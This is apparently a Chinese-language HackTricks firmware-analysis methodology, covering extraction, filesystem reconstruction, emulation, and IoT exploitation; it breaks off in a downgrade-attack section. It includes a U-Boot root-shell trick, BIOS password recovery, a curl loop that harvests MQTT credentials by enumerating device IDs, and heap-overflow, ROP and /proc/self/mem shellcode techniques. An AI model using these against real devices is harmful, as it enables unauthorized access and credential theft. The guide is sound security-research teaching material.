# 固件分析

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **简介**

### 相关资源

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

固件是确保设备正常运行的关键软件，负责管理并促进硬件组件与用户交互的软件之间的通信。固件存储在永久性存储器中，因此设备从通电起就能访问重要指令，进而启动操作系统。检查并可能修改固件，是识别安全漏洞的关键步骤。<sup>[[2]](#references)[[3]](#references)</sup>

## **收集信息**

**收集信息**是了解设备组成及其所用技术的重要初始步骤。此过程包括收集以下数据：

- CPU 架构及其运行的操作系统
- Bootloader 的具体信息
- 硬件布局和数据手册
- 代码库指标和源代码位置
- 外部库及其许可证类型
- 更新历史和监管认证
- 架构图和流程图
- 安全评估及已发现的漏洞

为此，**开源情报（OSINT）**工具不可或缺；同时，也可以通过人工和自动化审查流程分析任何可用的开源软件组件。[Coverity Scan](https://scan.coverity.com) 和 [Semmle’s LGTM](https://lgtm.com/#explore) 等工具提供免费的静态分析，可用于发现潜在问题。

## **获取固件**

可以通过多种方式获取固件，各种方式的复杂程度各不相同：

- 直接从来源获取（开发人员、制造商）
- 根据提供的说明自行构建
- 从官方支持网站下载
- 使用 **Google dork** 查询查找托管的固件文件
- 直接访问**云存储**，例如使用 [S3Scanner](https://github.com/sa7mon/S3Scanner)
- 使用中间人技术拦截**更新**
- 通过 **UART**、**JTAG** 或 **PICit** 等连接从设备中**提取**
- **嗅探**设备通信中的更新请求
- 识别并使用**硬编码的更新端点**
- 从 Bootloader 或网络中**转储**
- 如果其他方法都行不通，则使用适当的硬件工具**拆下并读取**存储芯片

### 仅有 UART 日志：通过 flash 中的 U-Boot env 强制启动 root shell

如果 UART RX 被忽略（只有日志），仍然可以通过离线**编辑 U-Boot 环境块**来强制启动 init shell：<sup>[[6]](#references)</sup>

1. 使用 SOIC-8 夹和编程器（3.3V）转储 SPI flash：
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. 定位 U-Boot env 分区，编辑 `bootargs`，加入 `init=/bin/sh`，并为该 blob **重新计算 U-Boot env CRC32**。
3. 仅重新刷写 env 分区并重启；UART 上应该会出现 shell。

这在 bootloader shell 已禁用、但可通过外部 flash 访问写入 env 分区的嵌入式设备上很有用。

## 分析固件

现在你**已经拿到固件**，需要提取其中的信息，以了解如何处理它。可以使用以下不同工具：

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

如果使用这些工具没有找到太多内容，请用 `binwalk -E <bin>` 检查映像的 **entropy**；如果熵低，那么它不太可能经过加密。如果熵高，则很可能经过了加密（或以某种方式压缩）。

此外，你可以使用这些工具提取 **firmware 内嵌的文件**：

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

或者使用 [**binvis.io**](https://binvis.io/#/)（[代码](https://code.google.com/archive/p/binvis/)）检查文件。

### 差分 flash 分析与可恢复的 XOR 密钥存储

如果某个 firmware 设置没有公开的存储格式，先进行多次匹配的 flash 读取，只更改**一个**设置，再次转储整个芯片并比较偏移量。用受控值重复实验，可以将该设置与计数器和写入元数据区分开来；如果更改出现在新偏移量而非原位置，则说明存储区可能是只追加式或日志结构式的。保留已删除或已标记删除的条目，因为其载荷字节可能仍可恢复。<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

定位到该区域后，使用 `binwalk` 等工具提取固件模块，并在 Ghidra 中逆向分析写入器/验证器。在代码中确认字段边界、填充、密钥索引和密钥派生方式，不要仅凭密文模式推断方案。<sup>[[12]](#references)</sup>

#### 从加密的零填充中恢复密钥

如 [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) 所述，已知明文可以揭示相同偏移处的密钥流字节。当固定长度字段的零填充覆盖重复 XOR 密钥的每个索引时，该字段尤其容易受到攻击：加密后的填充会直接揭示这些密钥字节，因为 `0x00 XOR key_byte = key_byte`。如果覆盖了所有密钥索引，就可以从密文尾部重建密钥，并解密已填入数据的字节。<sup>[[12]](#references)</sup>

Dell 的易受攻击 DVAR BIOS 密码格式就是一个具体示例：32 字节字段中的字节 `0` 为明文，而字节 `1..31` 使用一个重复的 20 字节密钥。<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

对于长度为 `L` 的密码，`L..31` 位置在 XOR 前均为零。当 `L <= 12` 时，这些位置涵盖了所有 key 索引，因此无需 brute force 即可恢复完整的 key 和密码：<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### 从历史记录中提取密钥

不要独立分析每条记录。DVAR 密钥大致由 `modified_md5(device_seed || variable_GUID || password[0])` 派生：device seed 和 GUID 是固定的，唯一依赖密码的输入是明文首字节。因此，每台设备最多有 256 个密钥，以相同字节开头的记录会共用一个密钥。按该字节对活动记录和已删除记录分组；一条较短的历史记录可能通过填充泄露完整密钥，从而解密当前较长、填充本身不足以恢复密钥的记录。因此，密码轮换可能反而增加暴露风险，尤其是在旧密文被标记为 tombstone 而非擦除时。<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) 工具可定位 DVAR、验证候选记录、恢复密码，并显示原始存储字节/密钥字节。从代码检出目录构建该工具，并按以下方式扫描已验证的 flash 镜像：<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

对于自定义解析器，应通过记录结构、可打印字符约束、零填充检查、密钥熵，以及密钥循环回绕时的一致性来排除误报。如果多次转储显示每次写入只有少量位翻转，请枚举观察到的掩码，并依据这些约束对修正结果排序；但对于有歧义的字符，应报告其存在歧义，而不要将启发式输出说成精确恢复结果。<sup>[[12]](#references)</sup>

密码验证器应存储加盐、经过迭代的单向哈希，而不是可逆密文；采用日志结构的存储应安全移除已被取代的秘密材料。<sup>[[12]](#references)</sup>

### 获取文件系统

使用前面提到并加了注释的工具，例如 `binwalk -ev <bin>`，你应该已经能够**提取文件系统**。\
Binwalk 通常会将其提取到一个**以文件系统类型命名的文件夹**中，常见类型包括：squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs。

#### 手动提取文件系统

有时，binwalk 的签名中**没有文件系统的魔数字节**。在这种情况下，使用 binwalk **查找文件系统的偏移量，并从二进制文件中 carve 出压缩文件系统**，然后按照其类型，使用以下步骤**手动提取**文件系统。

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

运行以下 **dd command** 提取 Squashfs 文件系统。

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

或者也可以运行以下命令。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- 对于 squashfs（如上例所用）

`$ unsquashfs dir.squashfs`

之后，文件将位于 "`squashfs-root`" 目录中。

- CPIO archive 文件

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- 对于 jffs2 文件系统

`$ jefferson rootfsfile.jffs2`

- 对于使用 NAND flash 的 ubifs 文件系统

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### 重建拆分的嵌入式 root 文件系统

如果原始 eMMC/SSD dump 中包含有效的文件系统头，但其元数据偏移超出了分区的名义范围，不要立即将其判定为损坏。嵌入式启动代码可以通过 Device Mapper 将多个物理范围组合成实际的 root 设备，因此，仅从一个 GPT 分区提取数据只会得到第一个片段。<sup>[[9]](#references)</sup>

#### 检查完整的介质映像

首先确认采集已完成、文件大小稳定，并且没有写入程序仍在占用该映像。如果文件名中包含起始/结束地址，请将该范围与实际字节数进行比较。以只读模式恢复 GPT，并仅挂载所需范围；不要在工作站上对不可信的物理卷运行 `vgchange -ay`，因为这可能导致卷组冲突和意外写入。<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

当原始 init 逻辑或 LVM 堆栈必须读取整个镜像时，优先使用一次性 VM。标准启动分区中的历史启动日志尤其有用：bootloader 可能记录了专有容器的偏移、组件长度、槽位选择、对齐规则和签名验证信息。使用这些值提取嵌入的命令行、kernel/initramfs，然后分别使用 `file`、magic bytes 和 `binwalk` 验证每个输出；读取到容器末尾可能会意外地把 initrd、ACPI 对象或签名附加到 kernel 后面。<sup>[[9]](#references)</sup>

#### 还原启动时的块映射

提取 kernel 的 initramfs，并对其 `/init` 及任何存储库进行逆向分析。在 [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) 中，跟踪 `/proc/cmdline`、`/dev/mapper/`、`dmsetup`、`BLKGETSIZE64` 和分区路径的字符串引用；然后追踪选择活动 A/B 槽位并构建映射表的代码。radare2 的实用起始命令包括 `r2 -A init`、`afl`、`pdf @ main` 和 `pdf @ fcn.xxxxx`。<sup>[[9]](#references)</sup>

linear target 会将虚拟设备的连续范围映射到一个或多个底层设备的范围。还原出的双段映射表通常采用以下形式（所有位置和长度均以 512 字节扇区为单位）：<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

请严格复现机器码运算，包括整数位宽、移位和单位换算。例如，以下表达式会先将字节大小向下取整到 4-KiB 边界，再转换为 512-byte 扇区；如果分区未按页对齐，将其替换为 `p4_bytes // 512` 会使选定的尾部偏移 `p4_bytes % 4096`。<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

通过按表格顺序复制各个范围，并使用有界分块，而不是将完整媒体转储加载到内存中，来重建平坦分析映像。这样也能避免创建主机侧映射器设备。将 GPT 派生的偏移量、反转后的扇区计数和最终输出长度分别作为断言检查。<sup>[[9]](#references)</sup>

#### 区分损坏与固定的重建错误

对于 SquashFS，在运行 `unsquashfs` 前，检查 `hsqs` magic，并解码超级块偏移量 40 处的小端序 64 位 `bytes_used` 字段。如果多个互不相关的结构都提取失败，请在预期位置附近搜索较大的窗口，并要求找到有力的结构候选：可解压的元数据块、多个连续的有效目录项、合理的 inode 字段、与 inode 数量一致的根 inode，或有效的完整性元数据结构。单个 magic 匹配并不足够。<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

当相同的有符号偏移量能让多个独立结构变得有效时（例如目录元数据和 verity 记录），可能的原因是系统性的段起始位置错误，而不是缺少字节。回到反向运算，检查是否丢弃了余数、符号处理是否有误、是否发生溢出，或是否进行了扇区/页面舍入，然后再尝试恢复孤立数据或修补文件系统元数据。<sup>[[9]](#references)</sup>

最后，保护边界应分别看待：TPM 密封的 LUKS 卷保护数据机密性，而签名的 dm-verity 映射保护根文件系统完整性。软件 TPM 无法恢复密封到原始物理 TPM 的密钥；通过省略 verity 验证的、仅用于研究的 init 启动经过修改的 SquashFS，也不会伪造其签名或破坏 dm-verity。<sup>[[9]](#references)</sup>

## 分析固件

获取固件后，必须对其进行剖析，以了解其结构和潜在漏洞。此过程需要使用各种工具来分析固件镜像并提取有价值的数据。

### 初始分析工具

下面提供了一组用于初步检查二进制文件（记为 `<bin>`）的命令。这些命令有助于识别文件类型、提取字符串、分析二进制数据，以及了解分区和文件系统的详细信息：

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

要评估镜像的加密状态，可以使用 `binwalk -E <bin>` 检查**熵**。熵较低表示可能未加密，而熵较高则表示可能经过加密或压缩。

要提取**嵌入文件**，建议使用 **file-data-carving-recovery-tools** 文档等工具和资源，以及 **binvis.io** 检查文件。

### 提取文件系统

使用 `binwalk -ev <bin>` 通常可以提取文件系统，提取结果通常位于以文件系统类型命名的目录中（例如 squashfs、ubifs）。但是，如果 **binwalk** 因缺少 magic bytes 而无法识别文件系统类型，则需要手动提取。具体步骤是先使用 `binwalk` 定位文件系统的偏移量，然后使用 `dd` 命令提取文件系统：

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

之后，根据文件系统类型（例如 squashfs、cpio、jffs2、ubifs），使用不同的命令手动提取其内容。

### 文件系统分析

提取文件系统后，便可开始查找安全漏洞。重点检查不安全的网络守护进程、硬编码凭据、API 端点、更新服务器功能、未编译的代码、启动脚本，以及用于离线分析的编译二进制文件。

需要检查的**关键位置**和**项目**包括：

- **etc/shadow** 和 **etc/passwd** 中的用户凭据
- **etc/ssl** 中的 SSL 证书和密钥
- 可能存在漏洞的配置文件和脚本文件
- 用于进一步分析的嵌入式二进制文件
- 常见的 IoT 设备 Web 服务器和二进制文件

以下工具有助于发现文件系统中的敏感信息和漏洞：

- 用于搜索敏感信息的 [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 和 [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 用于全面固件分析的 [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- 用于静态和动态分析的 [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) 和 [**EMBA**](https://github.com/e-m-b-a/emba)

### 编译二进制文件的安全检查

必须仔细检查文件系统中的源代码和编译二进制文件，以查找漏洞。**checksec.sh** 等工具可用于 Unix 二进制文件，**PESecurity** 则可用于 Windows 二进制文件，帮助识别可能遭到利用的未受保护二进制文件。

## 通过派生的 URL token 获取云端配置和 MQTT 凭据

许多 IoT hub 会从类似以下格式的云端端点获取各设备的配置：<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

在固件分析过程中，你可能会发现 `<token>` 是使用硬编码密钥，根据设备 ID 在本地派生的，例如：

- token = MD5( deviceId || STATIC_KEY )，并以大写十六进制表示

这种设计意味着，任何获知 deviceId 和 STATIC_KEY 的人都可以重建该 URL 并获取云端配置，其中往往包含明文 MQTT 凭据和 topic 前缀。

实用操作流程：

1) 从 UART 启动日志中提取 deviceId

- 连接 3.3V UART 适配器（TX/RX/GND）并捕获日志：

```bash
picocom -b 115200 /dev/ttyUSB0
```

- 查找打印 cloud config URL 模式和 broker 地址的行，例如：

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) 从 firmware 中恢复 STATIC_KEY 和 token 算法

- 将二进制文件载入 Ghidra/radare2，搜索配置路径（"/pf/"）或 MD5 用法。
- 确认算法（例如，MD5(deviceId||STATIC_KEY)）。
- 在 Bash 中生成 token，并将摘要转换为大写：

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) 收集云配置和 MQTT 凭据

- 拼接 URL 并使用 curl 拉取 JSON；用 jq 解析以提取 secrets：

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 滥用明文 MQTT 和薄弱的 topic ACL（如果存在）

- 使用恢复的凭据订阅维护 topic，并查找敏感事件：

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 枚举可预测的设备 ID（大规模进行，需获得授权）

- 许多生态系统会将厂商 OUI/产品/类型字节与顺序后缀组合在一起。
- 你可以遍历候选 ID，以编程方式派生 token 并获取配置：

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

说明
- 尝试大规模枚举前，务必获得明确授权。
- 尽可能优先使用仿真或静态分析来恢复机密，避免修改目标硬件。

仿真固件的过程可对设备的运行情况或单个程序进行**动态分析**。这种方法可能会遇到硬件或架构依赖方面的挑战，但将 root 文件系统或特定二进制文件转移到架构和字节序匹配的设备（例如 Raspberry Pi）或预构建的虚拟机中，有助于进一步测试。

### 仿真单个二进制文件

检查单个程序时，确定程序的字节序和 CPU 架构至关重要。

#### MIPS 架构示例

要仿真 MIPS 架构的二进制文件，可以使用以下命令：

```bash
file ./squashfs-root/bin/busybox
```

并安装必要的仿真工具：

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

对于 MIPS（big-endian），使用 `qemu-mips`；对于 little-endian 二进制文件，则应使用 `qemu-mipsel`。

#### ARM Architecture Emulation

对于 ARM 二进制文件，流程类似，使用 `qemu-arm` emulator 进行模拟。

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) 等工具可用于完整 firmware 模拟，实现流程自动化并辅助动态分析。

### Reconstructing split and verified root filesystems for emulation

如果 SquashFS superblock 可读，但 inode、目录或 fragment table 的偏移不合理，不要立即去 patch `unsquashfs`。应逆向分析早期启动二进制文件，并重现其创建的 block-device graph：嵌入式系统可能会提供一个名义上的 root partition，但实际构建的文件系统使用 `dm-linear` 映射，并追加从另一个 partition 借用的 sectors。即使后续所有 metadata block 都发生了偏移，仅检查 superblock 也可能成功。<sup>[[11]](#references)</sup>

精确保留 firmware 中的运算方式。特别要确认长度的单位是 bytes、512-byte sectors 还是 4 KiB pages；按照原始顺序复现移位和截断；并考虑 A/B 布局中依赖 bank 的尾部区域。例如，`(partition_bytes >> 12) << 3` 会先截断到 4 KiB 边界，然后才将结果表示为 512-byte sectors；若改用 `partition_bytes // 512`，追加区域的起始位置可能偏移几 KB，从而破坏所有下游 SquashFS tables。<sup>[[11]](#references)</sup>

一种实用的验证流程如下：<sup>[[11]](#references)</sup>

1. 从 verifier/init 二进制文件中还原每个 `dm-linear` segment 的源设备、起始 sector 和长度。
2. 拼接或映射这些 extent，同时保持其对齐语义不变。
3. 如果仍无法提取，只在预测边界附近的小范围内搜索，并要求连续出现多个有效 metadata structures，而不是仅凭看似合理的 superblock 就判定成功。
4. 对重建后的镜像运行未修改的 `unsquashfs`；成功遍历所有目录和 fragments，比 `unsquashfs -stat` 更有说服力。

#### Analyst-controlled dm-verity replacement

如果分析人员能够控制 QEMU kernel、initramfs 和虚拟磁盘，可以用一个小型静态链接 init 替换厂商的 verification PID 1，从而启动修改后的 root。这是**实验室环境中的 boot-chain 替换**，并不意味着攻破了 dm-verity、其 RSA 签名、Secure Boot 或 TPM 封装的密钥。<sup>[[11]](#references)</sup>

替换后的 init 应复现原始启动流程中的实际操作：挂载 `devtmpfs`、调用 `setsid()`、将 `/dev/console` 连接到文件描述符 0–2、挂载 `/proc` 和 `/sys`、等待提供的 block device、以只读方式挂载修改后的 root、卸载旧 root 的伪文件系统、将新挂载移动到 `/`、执行 `chroot`，然后 `execve()` firmware 原有的 `/sbin/init`。在 `MS_MOVE` **之前**卸载 `/dev`、`/proc` 和 `/sys`，可避免误卸载属于新 root 的挂载点。<sup>[[11]](#references)</sup>

将可变的设备状态与修改后的只读 root 分开保存。qcow2 overlay 可以保留原始磁盘的 LVM 状态，同时使用第二个只读 virtio 磁盘提供修改后的 SquashFS：<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### 离线镜像状态调试

当启动缓慢、破坏性启动脚本或不可靠的控制台日志使故障难以定位时，请检查 guest 外部的持久化状态。切勿挂载正在被运行中的 VM 使用的 overlay；使用 `qemu-nbd` 将其暴露出来，将 LVM 发现范围限制为预期的 NBD 分区，并在断开连接前停用卷组。<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

为便于重复进行故障隔离，请将带时间戳的标记文件写入稳定的可写卷，并离线验证；`/dev/kmsg`、FIFO 和临时控制台可能因速率限制或进程过早退出而产生假阴性。此外，在更改无关代码前，也要比较各层的确切接口：`uname -r` 与 `/lib/modules/`、磁盘上的 ext4 特性与内核配置，以及 Mesa `libGL` 的版本与 DRI 驱动 ABI 和根据 PCI 信息推导出的驱动名称。某个组件可能确实存在，甚至能成功执行 `dlopen()`，但仍无法使用，因为其使用方预期的是不同的 ABI。<sup>[[11]](#references)</sup>

## 实际动态分析

在此阶段，使用真实或模拟的设备环境进行分析。必须确保能够通过 shell 访问操作系统和文件系统。模拟可能无法完美复现硬件交互，因此有时需要重启模拟环境。分析时应重新检查文件系统，利用暴露的网页和网络服务，并探索 bootloader 漏洞。固件完整性测试对于识别潜在的后门漏洞至关重要。

## 运行时分析技术

运行时分析是指在进程或二进制文件的运行环境中与其交互，并使用 gdb-multiarch、Frida 和 Ghidra 等工具设置断点，通过 fuzzing 和其他技术识别漏洞。

对于没有完整调试器的嵌入式目标，**将静态链接的 `gdbserver` 复制到设备上并远程附加**：<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor 消息映射

在 IoT hub 上，RF stack 通常由 **radio MCU** 和 Linux userland 进程共同处理。一个实用的工作流程是映射整个路径：<sup>[[8]](#references)</sup>

1. 空中的 **RF frame**
2. radio MCU 上的 **controller-side parser**
3. 转发到 Linux 的 **serial/UART text 或 TLV protocol**（例如 `/dev/tty*`）
4. 主 daemon 中的 **application dispatcher**
5. **protocol-specific handler / state machine**

这种架构会产生两个逆向目标，而不是一个。如果 controller 将二进制 radio frame 转换为文本协议（例如 `Group,Command,arg1,arg2,...`），就要找出：

- **message groups** 和 dispatch tables
- 哪些消息可以来自 **network**，哪些只能来自 controller 本身
- 确切的 **manufacturer-specific discriminator fields**（例如 Zigbee `manufacturer_code` 和自定义 `cluster_command`）
- 哪些 handler 只能在 **commissioning**、discovery 或 firmware/model 下载阶段访问

对于 Zigbee，捕获配对流量，并检查目标是否仍依赖默认 **Link Key** `ZigBeeAlliance09`。如果是，嗅探 commissioning 流量可能会暴露 **Network Key**。Zigbee 3.0 install codes 可以降低这种暴露风险，因此要记录受测设备是否确实强制要求使用它们。

### Manufacturer-specific protocol handlers 和 FSM 限制的可达性

Vendor-specific Zigbee/ZCL commands 往往比标准 cluster 更值得关注，因为它们会进入**自定义解析代码**和内部 **FSM**，这些代码的验证通常较少经过实战检验。<sup>[[8]](#references)</sup>

实用工作流程：

- 逆向 command dispatcher，直到找到 **vendor-only handler**。
- 找出 **FSM state**、**event**、**check**、**action** 和 **next-state** tables。
- 确定会自动推进的 **transitional states**，以及最终会重置或释放攻击者可控状态的 retry/error 分支。
- 确认需要哪些合法的 protocol exchanges 才能让 daemon 进入易受攻击的状态，而不是假设有缺陷的 handler 始终可达。

对于对时序敏感的协议，使用 Python framework 重放 packet 可能太慢。更可靠的方法是在真实硬件（例如 **nRF52840**）上模拟合法设备，并使用 vendor-grade stack，从而暴露正确的 **endpoints**、**attributes** 和 commissioning 时序。

### Embedded daemon 中的分片下载 bug 类别

一种常见的 firmware bug 出现在**分片 blob/model/configuration 下载**中：<sup>[[8]](#references)</sup>

1. **第一个 fragment**（`offset == 0`）会存储 `ctx->total_size`，并分配 `malloc(total_size)`。
2. 后续 fragment 只会验证攻击者可控的**packet-local**字段，例如 `packet_total_size >= offset + chunk_len`。
3. 拷贝操作使用 `memcpy(&ctx->buffer[offset], chunk, chunk_len)`，却没有检查是否超出**最初分配的大小**。

攻击者可以：

- 发送第一个有效 fragment，并声明一个**较小**的总大小，以强制进行小型 heap allocation。
- 后续发送一个具有**预期 offset**、但 `chunk_len` 更大的 fragment。
- 伪造 packet-local size，使其通过新检查，同时仍溢出最初分配的 buffer。

当易受攻击的路径受 commissioning logic 控制时，攻击必须包含足够的**设备模拟**，先让目标进入预期的 model-download 或 blob-download 状态，再发送格式错误的 fragment。

### 由协议触发的 `free()`

在 embedded daemon 中，触发 heap metadata exploitation 最简单的方法往往不是“等待清理”，而是**触发协议自身的错误处理**：<sup>[[8]](#references)</sup>

- 发送格式错误的后续 fragment，推动 FSM 进入 **retry** 或 **error** 状态。
- 超过 retry threshold，使 daemon **重置 context** 并释放被破坏的 buffer。
- 利用这个可预测的 `free()` 触发 allocator-side primitives，避免进程因其他原因先崩溃。

这种方法尤其适用于 embedded Linux 中的 **musl/uClibc/dlmalloc-like** allocators。破坏 chunk metadata 可以将 unlink/unbin logic 转化为写入原语。一种稳定的做法是破坏 **size field**，将 allocator traversal 引导至溢出 buffer 内预先布置的 **fake chunks**，而不是立即破坏真实的 bin pointers 并导致进程崩溃。

## 二进制利用和概念验证

为已识别的漏洞开发 PoC，需要深入了解目标架构，并使用较低级别的语言编程。嵌入式系统中很少启用 binary runtime protections，但若存在，可能需要 Return Oriented Programming (ROP) 等技术。

### uClibc fastbin exploitation 注意事项（embedded Linux）

- **Fastbins + consolidation：**uClibc 使用类似 glibc 的 fastbins。后续的大型 allocation 可能触发 `__malloc_consolidate()`，因此任何 fake chunk 都必须通过检查（合理的 size、`fd = 0`，并且相邻 chunks 会被视为“in use”）。<sup>[[6]](#references)</sup>
- **ASLR 下的 non-PIE binaries：**如果启用了 ASLR，但主 binary 是 **non-PIE**，则 binary 内的 `.data/.bss` 地址是稳定的。可以选择一个已经类似有效 heap chunk header 的区域，使 fastbin allocation 落到 **function pointer table** 上。
- **让 parser 停止的 NUL：**解析 JSON 时，payload 中的 `\x00` 可以停止解析，同时保留后续由攻击者控制的 bytes，以供 stack pivot/ROP chain 使用。
- **通过 `/proc/self/mem` 执行 shellcode：**ROP chain 可以调用 `open("/proc/self/mem")`、`lseek()` 和 `write()`，将可执行 shellcode 写入已知的 mapping 并跳转执行。

## 用于 Firmware Analysis 的预配置操作系统

[AttifyOS](https://github.com/adi0x90/attifyos) 和 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 等操作系统提供了预配置环境，用于 firmware security testing，并配备了必要的工具。

## 用于分析 Firmware 的预配置 OS

- [**AttifyOS**](https://github.com/adi0x90/attifyos)：AttifyOS 是一个旨在帮助你对 Internet of Things (IoT) 设备进行 security assessment 和 penetration testing 的发行版。它提供了预配置环境并加载了所有必要工具，能为你节省大量时间。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS)：基于 Ubuntu 18.04 的 embedded security testing 操作系统，预装了 firmware security testing 工具。

## Firmware 降级攻击和不安全的更新机制

即使 vendor 对 firmware image 实现了 cryptographic signature checks，**版本回滚（降级）保护也经常被忽略**。如果 boot 或 recovery loader 只使用内置公钥验证签名，却不比较待刷入 image 的*版本*（或 monotonic counter），攻击者就可以合法安装**仍带有有效签名的旧版易受攻击 firmware**，从而重新引入已修复的漏洞。<sup>[[4]](#references)</sup>

典型攻击流程：

1. **获取较旧的签名 image**
   * 从 vendor 的公开下载门户、CDN 或支持网站获取。
